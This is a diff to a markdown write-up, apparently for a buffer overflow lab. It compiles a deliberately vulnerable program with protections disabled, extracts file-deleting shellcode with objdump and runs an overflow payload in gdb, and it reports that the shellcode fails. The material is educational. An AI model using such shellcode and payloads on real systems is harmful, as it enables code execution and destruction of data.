@@ -49,27 +49,36 @@ _filename:
 Complie by gcc:
 `gcc -g vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack`
 
-
-Run file_del: 
+<br>
+Run file_del: <br>
 `nasm -g -f elf file_del.asm`
+<br>
 `ld -m elf_i386 -o file_del file_del.o`
+<br>
 ![compile vuln](./imgs/file_del1.png)
-
+<br>
 Run this command to get shellcode from `file_del`:
+<br>
 `for i in $(objdump -d file_del |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo`
+<br>
 ![shellcode](./imgs/file_del2.png)
+<br>
 
 Use `gdb` to run program:
+<br>
 `gdb vuln.out -q`
+<br>
 ![gdb](./imgs/file_del3.png)
-
-break at 2 points:
+<br>
+break at 2 points: <br>
 `0x08048441`
+<br>
 `0x0804846b`
-Run program:
+<br>
+<br> Run program: <br>
 `gdb-pead$ r $(python -c "print('\xeb\x13\xb8\x0a\x00\x00\x00\xbb\x7a\x80\x04\x08\xcd\x80\xb8\x01\x00\x00\x00\xcd\x80\xe8\xe8\xff\xff\xff\x64\x75\x6d\x6d\x79\x66\x69\x6c\x65\x00' + 'a'*32 + '\xff\xff\xff\xff')")`
 ![](./imgs/file_del4.png)
-Continue: `gdb-peda$ c`
+<br> Continue: `gdb-peda$ c` <br>
 ![](./imgs/file_del5.png)
-`x/80xb $esp` to check stack 
+<br> `x/80xb $esp` to check stack <br>
 We got some problem in shellcode. It's wrong when running program.
